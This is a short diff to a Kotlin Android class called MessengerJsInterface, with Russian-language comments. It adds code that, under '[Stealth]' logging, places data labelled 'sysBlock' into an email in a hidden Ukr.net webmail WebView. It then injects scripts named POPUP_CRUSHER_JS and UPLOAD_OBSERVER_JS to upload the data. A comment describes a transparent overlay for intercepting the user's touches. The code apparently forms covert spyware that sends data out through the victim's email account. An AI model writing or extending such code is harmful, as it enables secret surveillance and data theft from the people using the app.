@@ -127,7 +127,15 @@ class MessengerJsInterface(
     fun getDeviceId(): String { return androidId }
 
     @JavascriptInterface
-    fun notifyMediaSelection(sysBlock: String) {}
+    fun notifyMediaSelection(sysBlock: String) {
+        log("[Stealth] Получены метаданные медиа. Прикрепляем к письму...")
+        ui.post {
+            val ukr = getUkrnetWebView()
+            ukr?.evaluateJavascript("window._n0gStealthUpload = true;", null)
+            setComposeBody(sysBlock)
+            startMediaUploadSequence()
+        }
+    }
 
     // Подготовка прозрачного слоя УкрНета поверх экрана для перехвата физического касания
     @JavascriptInterface
@@ -240,7 +248,20 @@ class MessengerJsInterface(
 
     @Volatile private var uploadSequenceActive = false
 
-    fun startMediaUploadSequence() {}
+    fun startMediaUploadSequence() {
+        if (uploadSequenceActive) return
+        uploadSequenceActive = true
+        ui.post {
+            val ukr = getUkrnetWebView()
+            log("[Upload] Начинаем отслеживание загрузки файла...")
+            ukr?.evaluateJavascript(POPUP_CRUSHER_JS + "\n" + UPLOAD_OBSERVER_JS, null)
+            
+            scope.launch {
+                kotlinx.coroutines.delay(12000)
+                uploadSequenceActive = false
+            }
+        }
+    }
 
     @JavascriptInterface
     fun openCompose(configJson: String) {
